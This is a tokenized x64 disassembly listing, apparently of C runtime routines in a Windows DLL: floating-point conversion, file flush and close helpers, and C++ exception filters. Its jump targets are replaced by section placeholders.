jne r-xdata
test r10d r10d
jne r-xdata
mov r8d [ rbp - 0x15 ]
mov edx [ rbp - 0x19 ]
test r10d r10d
jns r-xdata
bt r9d 0x1e
jb r-xdata
test r10d r10d
je r-xdata
cmp cx dx
cmove eax r8d
mov ecx 0x8000
add cx r11w
mov r9d 0x8000
mov [ rbp - 0x65 ] r13d
lea r10d [ r9 - 0x1 ]
mov [ rbp - 0x61 ] ecx
movzx ecx [ rbp + 0x1 ]
movzx r15d cx
and cx r10w
mov [ rbp - 0x29 ] 0x0
xor r15w ax
and ax r10w
mov [ rbp - 0x21 ] r13d
and r15w r9w
lea r9d [ rax + rcx ]
cmp ax r10w
jae r-xdata
je r-xdata
lea r9 [ rw-data ]
neg r10d
sub r9 0x60
test r10d r10d
test cx cx
je r-xdata
lea rcx [ rbx + 0x4 ]
lea r8 [ r--data ]
mov edx 0x16
call sub_18001d5ec
test eax eax
je r-xdata
mov eax r11d
mov rcx [ rbp + 0x17 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0x108 ]
add rsp 0xc0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov r9d [ rbp - 0x11 ]
mov eax 0x15
mov [ rbp - 0xf ] r13w
mov esi [ rbp - 0x11 ]
cmp r12d eax
lea r10d [ rax - 0xd ]
cmovg r12d eax
shr r9d 0x10
sub r9d 0x3ffe
cwde
add r12d eax
test r12d r12d
jg r-xdata
neg r15w
sbb eax eax
and eax esi
add eax 0x7fff8000
mov [ rbp - 0x11 ] eax
cmp cx r10w
jae r-xdata
mov r8d [ rbp - 0x15 ]
mov edx [ rbp - 0x19 ]
cmp r9d esi
jne r-xdata
cmp r9d 0xc0000000
jne r-xdata
mov [ rbx + 0x3 ] 0x6
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_18001da10
int3
mov ecx r8d
mov eax edx
add esi esi
add r8d r8d
shr eax 0x1f
shr ecx 0x1f
or r8d eax
or esi ecx
add edx edx
sub r10 r11
jne r-xdata
mov [ rbp - 0x15 ] r8d
mov [ rbp - 0x19 ] edx
test r9d r9d
jns r-xdata
cmp [ rbp - 0x67 ] cx
mov eax 0x20
lea ecx [ rax + 0xd ]
cmove eax ecx
jmp r-xdata
cmp r9w r14w
ja r-xdata
test r10d r10d
jne r-xdata
cdqe
lea rcx [ rax + rax * 2 ]
lea r14 [ r9 + rcx * 4 ]
mov r9d 0x8000
mov [ rbp - 0x31 ] r14
cmp [ r14 ] r9w
jb r-xdata
lea rcx [ rbx + 0x4 ]
lea r8 [ r--data ]
mov edx 0x16
call sub_18001d5ec
test eax eax
jne r-xdata
test r10d r10d
jne r-xdata
test r10d r10d
jne r-xdata
lea r14d [ r12 + 0x1 ]
lea rdi [ rbx + 0x4 ]
mov r10 rdi
test r14d r14d
jle r-xdata
neg r9d
movzx r10d r9b
test r10d r10d
jle r-xdata
mov [ rbx + 0x3 ] 0x3001
mov r10d 0x3fbf
cmp r9w r10w
ja r-xdata
mov eax r10d
add r9 0x54
sar r10d 0x3
and eax 0x7
mov [ rbp - 0x51 ] r10d
mov [ rbp - 0x59 ] r9
je r-xdata
mov rbx [ rbp - 0x41 ]
mov ecx [ rbp - 0x61 ]
mov r14d 0xbffd
jmp r-xdata
movzx ecx [ r14 + 0xa ]
movzx eax [ rbp - 0xf ]
mov [ rbp - 0x65 ] r13d
movzx ebx cx
and cx r15w
mov [ rbp - 0x29 ] 0x0
xor bx ax
and ax r15w
mov [ rbp - 0x21 ] r13d
and bx r9w
lea r9d [ rax + rcx ]
mov [ rbp - 0x69 ] bx
cmp ax r15w
jae r-xdata
mov rcx [ r14 ]
mov eax [ r14 + 0x8 ]
lea r14 [ rbp + 0x7 ]
mov [ rbp + 0x7 ] rcx
shr rcx 0x10
mov [ rbp + 0xf ] eax
sub ecx r11d
mov [ rbp - 0x31 ] r14
mov [ rbp + 0x9 ] ecx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_18001da10
int3
lea rcx [ rbx + 0x4 ]
lea r8 [ r--data ]
lea edx [ r10 + 0x16 ]
call sub_18001d5ec
test eax eax
jne r-xdata
lea rcx [ rbx + 0x4 ]
lea r8 [ r--data ]
lea edx [ r10 + 0x16 ]
call sub_18001d5ec
test eax eax
je r-xdata
sub r10 r11
mov al [ r10 ]
sub r10 r11
cmp al 0x35
jl r-xdata
mov r13 [ rbp - 0x19 ]
mov ecx r8d
add r8d r8d
shr ecx 0x1f
mov eax edx
add edx edx
shr eax 0x1f
lea r9d [ rsi + rsi ]
mov [ rbp + 0x7 ] r13
or r8d eax
or r9d ecx
mov eax edx
mov ecx r8d
shr eax 0x1f
add r8d r8d
or r8d eax
add edx edx
add r9d r9d
shr ecx 0x1f
mov eax r13d
lea r15d [ rax + rdx ]
or r9d ecx
cmp r15d edx
jb r-xdata
mov ecx r8d
mov eax esi
shr edx 0x1
shr r8d 0x1
shl eax 0x1f
shl ecx 0x1f
sub r10d r11d
shr esi 0x1
or r8d eax
or edx ecx
test r10d r10d
jg r-xdata
test ax ax
jne r-xdata
mov [ rbp - 0x11 ] r13d
jmp r-xdata
mov eax [ rbp - 0x11 ]
mov r9d 0x3fff
shr eax 0x10
cmp ax r9w
jb r-xdata
neg bx
cmp cx r15w
jae r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_18001da10
int3
mov eax 0x5
mov [ rbx + 0x3 ] al
jmp r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_18001da10
int3
cmp r10 rdi
jae r-xdata
jmp r-xdata
lea eax [ r8 + 0x1 ]
xor ecx ecx
cmp eax r8d
jb r-xdata
cmp r15d eax
jae r-xdata
mov [ rbp - 0x15 ] r8d
mov [ rbp - 0x19 ] edx
test cx cx
jne r-xdata
add r9w r11w
test [ rbp - 0x11 ] edi
jne r-xdata
mov edx r13d
mov r8d r13d
mov r15d 0xbffd
cmp r9w r15w
ja r-xdata
mov r11d r13d
jmp r-xdata
cmp [ r10 ] 0x30
jne r-xdata
cmp r10 rdi
jae r-xdata
cmp r10 rdi
jae r-xdata
mov ecx r11d
cmp eax r11d
jae r-xdata
shr r13 0x20
lea r12d [ r8 + r13 ]
cmp r12d r8d
jb r-xdata
mov edi r13d
lea rdx [ rbp - 0x29 ]
add r9w r11w
test [ rbp - 0x1 ] edi
jne r-xdata
test r8d r8d
jne r-xdata
mov r15d 0x7fff
mov ebx 0x3fbf
cmp r9w bx
ja r-xdata
sub r10 r11
sub r10b bl
sub r10b 0x3
movsx rax r10b
mov [ rbx + 0x3 ] r10b
mov [ rax + rbx + 0x4 ] r13b
mov eax 0x20
mov r9d 0x8000
mov [ rbx + 0x3 ] r11b
cmp [ rbp - 0x67 ] r9w
lea ecx [ rax + 0xd ]
mov [ rdi ] 0x30
cmove eax ecx
jmp r-xdata
cmp [ r10 ] 0x39
jne r-xdata
cmp r10 rdi
jae r-xdata
add r9d r11d
mov r8d eax
test ecx ecx
je r-xdata
add r9d r11d
cmp r12d r13d
jae r-xdata
sub r12d r11d
add rdx 0x2
add edi r11d
xor r13d r13d
mov [ rbp - 0x49 ] r12d
test r12d r12d
jg r-xdata
mov r14d edi
lea rsi [ rbp - 0x1 ]
lea r12 [ rbp + rcx - 0x19 ]
and r14d r11d
cmp [ rbp - 0x5 ] r13d
jne r-xdata
test edx edx
jne r-xdata
test ax ax
jne r-xdata
mov [ rbp - 0x15 ] 0x0
mov r15d 0x7fff
jmp r-xdata
mov [ rbx ] r13w
mov [ rbx + 0x2 ] al
mov [ rbx + 0x5 ] r13b
jmp r-xdata
mov [ r10 ] 0x30
sub r10 r11
add [ r10 ] r11b
add r10 r11
add [ rbx ] r11w
mov esi [ rbp - 0x11 ]
jmp r-xdata
add r9d esi
xor r13d r13d
mov eax r15d
shr eax 0x1f
lea r8d [ r12 + r12 ]
mov ecx r12d
or r8d eax
shr ecx 0x1f
lea eax [ r9 + r9 ]
or eax ecx
lea edx [ r15 + r15 ]
sub r14d r11d
mov [ rbp - 0x11 ] eax
shr eax 0x18
mov [ rbp - 0x19 ] edx
add al 0x30
mov [ rbp - 0x15 ] r8d
mov [ rbp - 0xe ] r13b
mov [ r10 ] al
add r10 r11
test r14d r14d
jle r-xdata
lea eax [ rdi + rdi ]
xor ebx ebx
mov r13d r12d
movsxd rcx eax
test r12d r12d
jle r-xdata
mov rbx [ rbp - 0x41 ]
mov r8d [ rbp - 0x21 ]
mov r10d [ rbp - 0x29 ]
mov eax 0xc002
mov esi 0x80000000
mov r12d 0xffff
add r9w ax
test r9w r9w
jle r-xdata
mov r8d r11d
cmp r10d ecx
jae r-xdata
cmp [ rbp - 0x9 ] r13d
je r-xdata
mov [ rbp - 0xf ] r13w
jmp r-xdata
test cx cx
jne r-xdata
add r9w r11w
test [ rbp - 0x11 ] edi
jne r-xdata
mov edx r13d
mov r8d r13d
mov [ rbp - 0x19 ] edx
add r9w r12w
jns r-xdata
test esi r8d
jne r-xdata
sub r13d r11d
add r12 0x2
sub rsi 0x2
test r13d r13d
jg r-xdata
add [ rdx + 0x4 ] r11w
mov [ rdx ] r10d
test r8d r8d
je r-xdata
mov esi r13d
lea r10 [ rbp - 0x29 ]
mov edi r12d
add r9w r11w
test [ r14 + 0x8 ] edi
jne r-xdata
test r8d r8d
jne r-xdata
movzx eax [ rbp - 0x29 ]
mov ebx [ rbp - 0x65 ]
movzx eax r9w
neg ax
movzx edx ax
add r9w dx
test r9w r9w
jg r-xdata
mov edi [ rbp - 0x25 ]
mov edx r10d
add r8d r8d
shr edx 0x1f
add r10d r10d
mov ecx edi
shr ecx 0x1f
lea eax [ rdi + rdi ]
add r9w r12w
or eax edx
or r8d ecx
mov [ rbp - 0x29 ] r10d
mov [ rbp - 0x25 ] eax
mov [ rbp - 0x21 ] r8d
test r9w r9w
jg r-xdata
movzx eax [ r12 ]
movzx ecx [ rsi ]
mov r8d ebx
imul ecx eax
mov eax [ rdx ]
lea r10d [ rax + rcx ]
cmp r10d eax
jb r-xdata
mov r12d [ rbp - 0x49 ]
sub edi r11d
add r10 0x2
add esi r11d
test edi edi
jg r-xdata
mov ebx esi
lea r13 [ r14 + 0x8 ]
lea r12 [ rbp + rcx - 0x19 ]
and ebx r11d
xor r14d r14d
cmp [ r14 + 0x4 ] r13d
jne r-xdata
test edx edx
jne r-xdata
mov eax [ rbp - 0x27 ]
or edx 0xffffffff
cmp eax edx
jne r-xdata
and r10d 0x1ffff
cmp r10d 0x18000
jne r-xdata
mov edi [ rbp - 0x25 ]
mov eax r8d
shr r10d 0x1
mov ecx edi
shl eax 0x1f
shr edi 0x1
shl ecx 0x1f
or edi eax
shr r8d 0x1
or r10d ecx
sub rdx r11
mov [ rbp - 0x25 ] edi
mov [ rbp - 0x29 ] r10d
jne r-xdata
add ebx r11d
lea eax [ rsi + rsi ]
mov r15d edi
movsxd rcx eax
test edi edi
jle r-xdata
mov r10d [ rbp - 0x21 ]
mov r8d [ rbp - 0x29 ]
mov eax 0xc002
add r9w ax
mov esi 0x80000000
mov ebx 0xffff
test r9w r9w
jle r-xdata
mov r8d r11d
cmp edx ecx
jae r-xdata
cmp [ r14 ] r13d
je r-xdata
mov [ rbp - 0xf ] r13w
mov r15d 0x7fff
jmp r-xdata
add eax r11d
mov [ rbp - 0x27 ] eax
mov eax [ rbp - 0x23 ]
mov [ rbp - 0x27 ] r13d
cmp eax edx
jne r-xdata
mov eax 0x7fff
cmp r9w ax
jb r-xdata
test [ rbp - 0x29 ] r11b
je r-xdata
test ebx ebx
mov rbx [ rbp - 0x41 ]
mov [ rbp - 0x21 ] r8d
je r-xdata
add r9w bx
jns r-xdata
test esi r10d
jne r-xdata
sub r15d r11d
add r12 0x2
sub r13 0x2
test r15d r15d
jg r-xdata
add [ r10 + 0x4 ] r11w
mov [ r10 ] edx
test r8d r8d
je r-xdata
mov r9 [ rbp - 0x59 ]
movzx eax [ rbp - 0x27 ]
or r9w r15w
mov [ rbp - 0x13 ] r8d
mov [ rbp - 0x19 ] ax
mov eax [ rbp - 0x25 ]
mov [ rbp - 0xf ] r9w
mov [ rbp - 0x17 ] eax
mov r8d [ rbp - 0x15 ]
mov edx [ rbp - 0x19 ]
jmp r-xdata
neg r15w
mov r8d r13d
mov edx r13d
sbb eax eax
and eax esi
add eax 0x7fff8000
mov [ rbp - 0x11 ] eax
jmp r-xdata
add eax r11d
mov [ rbp - 0x23 ] eax
movzx eax [ rbp - 0x1f ]
mov [ rbp - 0x23 ] r13d
cmp ax r12w
jne r-xdata
movzx eax r10w
or ax r11w
mov [ rbp - 0x29 ] ax
mov r10d [ rbp - 0x29 ]
jmp r-xdata
movzx eax [ rbp - 0x29 ]
movzx eax r9w
neg ax
movzx edx ax
add r9w dx
mov [ rbp - 0x5d ] r9w
mov r9d [ rbp - 0x65 ]
test r9w r9w
jg r-xdata
mov edi [ rbp - 0x25 ]
mov edx r8d
add r10d r10d
shr edx 0x1f
add r8d r8d
mov ecx edi
shr ecx 0x1f
lea eax [ rdi + rdi ]
add r9w bx
or eax edx
or r10d ecx
mov [ rbp - 0x29 ] r8d
mov [ rbp - 0x25 ] eax
mov [ rbp - 0x21 ] r10d
test r9w r9w
jg r-xdata
movzx eax [ r12 ]
movzx ecx [ r13 ]
mov r8d r14d
imul ecx eax
mov eax [ r10 ]
lea edx [ rax + rcx ]
cmp edx eax
jb r-xdata
mov r14 [ rbp - 0x31 ]
xor r13d r13d
mov eax [ rbp - 0x61 ]
mov r12d [ rbp - 0x4d ]
mov [ rbx ] ax
test [ rbp - 0x39 ] r11b
je r-xdata
add ax r11w
mov [ rbp - 0x1f ] ax
jmp r-xdata
mov [ rbp - 0x1f ] cx
add r9w r11w
jmp r-xdata
mov ecx 0x8000
cmp ax cx
ja r-xdata
mov eax [ rbp - 0x27 ]
or edx 0xffffffff
cmp eax edx
jne r-xdata
and r8d 0x1ffff
cmp r8d 0x18000
jne r-xdata
mov edi [ rbp - 0x25 ]
mov eax r10d
shr r8d 0x1
mov ecx edi
shl eax 0x1f
shr edi 0x1
shl ecx 0x1f
or edi eax
shr r10d 0x1
or r8d ecx
sub rdx r11
mov [ rbp - 0x25 ] edi
mov [ rbp - 0x29 ] r8d
jne r-xdata
add r9d r11d
mov r8d [ rbp - 0x21 ]
jmp r-xdata
add eax r11d
mov [ rbp - 0x27 ] eax
mov eax [ rbp - 0x23 ]
mov [ rbp - 0x27 ] r13d
cmp eax edx
jne r-xdata
mov r15d 0x7fff
mov r12d 0x5
mov edi 0x7fffffff
cmp r9w r15w
jb r-xdata
test [ rbp - 0x29 ] r11b
je r-xdata
test r9d r9d
movzx r9d [ rbp - 0x5d ]
mov [ rbp - 0x21 ] r10d
je r-xdata
movzx eax [ rbp - 0x27 ]
or r9w [ rbp - 0x69 ]
mov [ rbp - 0x13 ] r10d
mov r10d [ rbp - 0x51 ]
mov [ rbp - 0x19 ] ax
mov eax [ rbp - 0x25 ]
mov [ rbp - 0x17 ] eax
mov r8d [ rbp - 0x15 ]
mov edx [ rbp - 0x19 ]
mov [ rbp - 0xf ] r9w
jmp r-xdata
movzx eax [ rbp - 0x69 ]
mov r10d [ rbp - 0x51 ]
neg ax
jmp r-xdata
add eax r11d
mov [ rbp - 0x23 ] eax
movzx eax [ rbp - 0x1f ]
mov [ rbp - 0x23 ] r13d
cmp ax bx
jne r-xdata
movzx eax r8w
or ax r11w
mov [ rbp - 0x29 ] ax
mov r8d [ rbp - 0x29 ]
jmp r-xdata
sbb eax eax
mov [ rbp - 0x15 ] r13d
and eax esi
add eax 0x7fff8000
mov [ rbp - 0x11 ] eax
add ax r11w
mov [ rbp - 0x1f ] ax
jmp r-xdata
mov [ rbp - 0x1f ] cx
add r9w r11w
jmp r-xdata
mov ecx 0x8000
cmp ax cx
ja r-xdata
mov r10d [ rbp - 0x21 ]
jmp r-xdata
sub_18002a124
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r15
sub rsp 0x10
and [ r8 ] 0x0
and [ r8 + 0x4 ] 0x0
and [ r8 + 0x8 ] 0x0
mov r10 r8
mov edi edx
mov r12 rcx
mov ebx 0x404e
test edx edx
je r-xdata
cmp [ r10 + 0x8 ] 0x0
jne r-xdata
xor r11d r11d
xor r8d r8d
xor r9d r9d
lea r15d [ r11 + 0x1 ]
mov r8d [ r10 + 0x8 ]
mov r11d 0x8000
test r11d r8d
jne r-xdata
mov r9d [ r10 + 0x4 ]
mov eax r15d
cmp ebp ecx
jae r-xdata
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov [ r10 + 0xa ] bx
mov rbx [ rsp + 0x30 ]
add rsp 0x10
pop r15
pop r13
pop r12
retn
mov r9d [ r10 + 0x4 ]
mov edx [ r10 ]
mov eax r9d
mov r8d r9d
shl eax 0x10
mov ecx edx
shr r8d 0x10
shr ecx 0x10
shl edx 0x10
mov [ r10 + 0x8 ] r8d
mov r9d ecx
mov [ r10 ] edx
or r9d eax
mov eax 0xfff0
add bx ax
mov [ r10 + 0x4 ] r9d
test r8d r8d
je r-xdata
shr rsi 0x20
xor eax eax
lea r11d [ r8 + rsi ]
cmp r11d r8d
jb r-xdata
mov eax r8d
inc r8d
xor ecx ecx
cmp r8d eax
jb r-xdata
mov [ r10 ] ebp
test eax eax
je r-xdata
mov eax [ r10 ]
mov edx r9d
add r8d r8d
mov ecx eax
add eax eax
shr edx 0x1f
shr ecx 0x1f
add r9d r9d
or r8d edx
or r9d ecx
mov [ r10 ] eax
mov eax 0xffff
add bx ax
mov [ r10 + 0x4 ] r9d
mov [ r10 + 0x8 ] r8d
test r11d r8d
je r-xdata
mov eax r15d
cmp r11d esi
jae r-xdata
mov ecx r15d
cmp r8d r15d
jae r-xdata
add r9d r13d
lea edx [ rbp + rbp ]
mov ecx r11d
shr ecx 0x1f
lea r8d [ r11 + r11 ]
add r9d r9d
or r9d ecx
mov eax ebp
mov [ r10 ] edx
shr eax 0x1f
mov [ r10 + 0x8 ] r9d
or r8d eax
xor eax eax
mov [ r10 + 0x4 ] r8d
movsx ecx [ r12 ]
lea r11d [ rdx + rcx ]
cmp r11d edx
jb r-xdata
add r9d r15d
mov [ r10 + 0x8 ] r9d
mov [ r10 + 0x4 ] r11d
test eax eax
je r-xdata
inc r9d
mov [ r10 + 0x8 ] r9d
mov [ r10 + 0x4 ] r8d
test ecx ecx
je r-xdata
mov eax r15d
cmp r11d ecx
jae r-xdata
add r12 r15
dec edi
mov [ r10 + 0x4 ] r8d
mov [ r10 + 0x8 ] r9d
jne r-xdata
mov eax r8d
inc r8d
xor ecx ecx
cmp r8d eax
jb r-xdata
mov [ r10 ] r11d
test eax eax
je r-xdata
mov rsi [ r10 ]
mov r13d [ r10 + 0x8 ]
mov ecx r8d
shr ecx 0x1f
add r8d r8d
add r9d r9d
or r9d ecx
lea edx [ r11 + r11 ]
mov eax r11d
shr eax 0x1f
add r9d r9d
mov [ rsp ] rsi
or r8d eax
mov eax edx
add edx edx
mov ecx r8d
shr eax 0x1f
add r8d r8d
shr ecx 0x1f
or r8d eax
xor eax eax
or r9d ecx
mov ecx esi
mov [ r10 ] edx
lea ebp [ rdx + rcx ]
mov [ r10 + 0x4 ] r8d
mov [ r10 + 0x8 ] r9d
cmp ebp edx
jb r-xdata
mov ecx r15d
cmp r8d r15d
jae r-xdata
inc r9d
mov [ r10 + 0x8 ] r9d
mov [ r10 + 0x4 ] r8d
test ecx ecx
je r-xdata
sub_18002a3ac
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
or edi 0xffffffff
mov rbx rcx
test rcx rcx
jne r-xdata
test [ rcx + 0x18 ] 0x83
je r-xdata
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
or eax edi
jmp r-xdata
and [ rbx + 0x18 ] 0x0
mov eax edi
call sub_18002921c
mov rcx rbx
mov edi eax
call sub_18002a6e8
mov rcx rbx
call sub_180025cc4
mov ecx eax
call sub_18002a624
test eax eax
jns r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx + 0x28 ]
test rcx rcx
je r-xdata
or edi 0xffffffff
jmp r-xdata
call sub_180018b3c
and [ rbx + 0x28 ] 0x0
sub_18002a428
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x20
mov rbx rcx
or edi 0xffffffff
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
test [ rcx + 0x18 ] 0x40
je r-xdata
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
call sub_180025bc0
nop
mov rcx rbx
call sub_18002a3ac
mov edi eax
mov rcx rbx
call sub_180025c58
jmp r-xdata
and [ rcx + 0x18 ] 0x0
jmp r-xdata
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov eax edi
jmp r-xdata
sub_18002a490
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
sub rsp 0x20
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_1800194ec
mov [ rax ] 0x9
jmp r-xdata
call sub_1800194ec
mov [ rax ] 0x9
call sub_18001dab4
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rbx rdi
mov rsi rdi
sar rsi 0x5
lea r12 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r12 + rsi * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_180028ec4
nop
mov rax [ r12 + rsi * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_1800194ec
mov [ rax ] 0x9
or ebx 0xffffffff
mov ecx edi
call sub_180028e50
mov rcx rax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
xor ebx ebx
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_180028f6c
mov eax ebx
jmp r-xdata
call sub_18001950c
mov [ rax ] ebx
test ebx ebx
je r-xdata
sub_18002a568
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rdi ecx
mov ecx edi
call sub_180028e50
cmp rax 0xffffffffffffffff
je r-xdata
xor ebx ebx
mov rax [ rw-data ]
mov ecx 0x2
cmp edi 0x1
jne r-xdata
xor eax eax
mov ecx ebx
call sub_18001952c
or eax 0xffffffff
jmp r-xdata
cmp edi ecx
jne r-xdata
test [ rax + 0xb8 ] dil
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx edi
call sub_180028e50
mov rcx rax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ rax + 0x60 ] 0x1
je r-xdata
call sub_180028e50
mov ecx 0x1
mov rbx rax
call sub_180028e50
cmp rax rbx
je r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_180028da4
mov r11 rdi
mov rcx rdi
sar rcx 0x5
and r11d 0x1f
lea rdx [ rw-data ]
mov rcx [ rdx + rcx * 8 ]
imul r11 r11 0x58
mov [ rcx + r11 + 0x8 ] 0x0
test ebx ebx
je r-xdata
sub_18002a624
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
sub rsp 0x20
movsxd rbx ecx
cmp ebx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_18001950c
and [ rax ] 0x0
call sub_1800194ec
mov [ rax ] 0x9
jmp r-xdata
call sub_18001950c
and [ rax ] 0x0
call sub_1800194ec
mov [ rax ] 0x9
call sub_18001dab4
cmp ebx [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rdi rbx
mov rsi rbx
sar rsi 0x5
lea r12 [ rw-data ]
and edi 0x1f
imul rdi rdi 0x58
mov rax [ r12 + rsi * 8 ]
movsx ecx [ rax + rdi + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx ebx
call sub_180028ec4
nop
mov rax [ r12 + rsi * 8 ]
test [ rax + rdi + 0x8 ] 0x1
je r-xdata
call sub_1800194ec
mov [ rax ] 0x9
or edi 0xffffffff
mov ecx ebx
call sub_18002a568
mov edi eax
jmp r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
mov ecx ebx
call sub_180028f6c
mov eax edi
jmp r-xdata
sub_18002a6e8
push rbx
sub rsp 0x20
test [ rcx + 0x18 ] 0x83
mov rbx rcx
je r-xdata
add rsp 0x20
pop rbx
retn
test [ rcx + 0x18 ] 0x8
je r-xdata
mov rcx [ rcx + 0x10 ]
call sub_180018b3c
and [ rbx + 0x18 ] 0xfffffbf7
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x8 ] eax
sub_18002a738
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov rbx [ r9 + 0x38 ]
mov rsi rdx
mov r12 r8
mov rbp rcx
lea r8 [ rbx + 0x4 ]
mov rdx r9
mov rcx rsi
mov rdi r9
call sub_18001b470
mov r11d [ rbx + 0x4 ]
mov r10d [ rbp + 0x4 ]
mov eax r11d
and r11d 0x2
mov r8d 0x1
and eax r8d
and r10b 0x66
cmove r11d eax
test r11d r11d
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov eax r8d
add rsp 0x20
pop r12
retn
mov r9 rdi
mov r8 r12
mov rdx rsi
mov rcx rbp
call sub_180019d48
mov r8d eax
sub_18002a858
push rbp
sub rsp 0x40
mov rbp rdx
lea rax [ rbp + 0x40 ]
mov [ rsp + 0x30 ] rax
mov rax [ rbp + 0x90 ]
mov [ rsp + 0x28 ] rax
mov rax [ rbp + 0x88 ]
mov [ rsp + 0x20 ] rax
mov r9 [ rbp + 0x80 ]
mov r8 [ rbp + 0x78 ]
mov rdx [ rbp + 0x70 ]
call sub_180019dd0
nop
add rsp 0x40
pop rbp
retn
sub_18002a9ab
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rbp + 0x68 ] rcx
mov [ rbp + 0x58 ] rcx
mov rax [ rbp + 0x58 ]
mov rcx [ rax ]
mov [ rbp + 0x28 ] rcx
mov [ rbp + 0x20 ] 0x0
mov rax [ rbp + 0x28 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x18 ] 0x4
jne r-xdata
mov [ rbp + 0x30 ] 0x0
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x18 ] 0x4
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930520
je r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930520
je r-xdata
mov rdx [ rbp + 0x28 ]
mov rax [ rbp + 0xc8 ]
mov rcx [ rax + 0x28 ]
cmp [ rdx + 0x28 ] rcx
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930521
je r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930521
je r-xdata
mov [ rbp + 0x20 ] 0x1
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930522
jne r-xdata
call sub_18001e320
mov [ rax + 0x2c0 ] 0x1
mov [ rbp + 0x20 ] 0x1
mov [ rbp + 0x30 ] 0x1
jmp r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930522
jne r-xdata
mov eax [ rbp + 0x30 ]
add rsp 0x20
pop rbp
retn
sub_18002aaab
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rcx [ rbp + 0x50 ]
call sub_18001a06c
cmp [ rbp + 0x20 ] 0x0
jne r-xdata
call sub_18001e320
mov rcx [ rbp + 0xd0 ]
mov [ rax + 0xf0 ] rcx
call sub_18001e320
mov rcx [ rbp + 0xd8 ]
mov [ rax + 0xf8 ] rcx
add rsp 0x28
pop rbp
pop rbx
retn
mov rbx [ rbp + 0xc8 ]
cmp [ rbx ] 0xe06d7363
jne r-xdata
cmp [ rbx + 0x18 ] 0x4
jne r-xdata
cmp [ rbx + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rbx + 0x28 ]
call sub_18001a038
test eax eax
je r-xdata
cmp [ rbx + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rbx
call sub_18001c098
nop
cmp [ rbx + 0x20 ] 0x19930522
jne r-xdata
sub_18002ab8b
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
cmp [ rax ] 0xc0000005
je r-xdata
mov eax 0x1
cmp [ rax ] 0xc000001d
je r-xdata
xor eax eax
jmp r-xdata
add rsp 0x20
pop rbp
retn
sub_18002ad60
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x38
mov rbp rdx
mov rbx [ rbp + 0x80 ]
mov rcx [ rbx + 0x10 ]
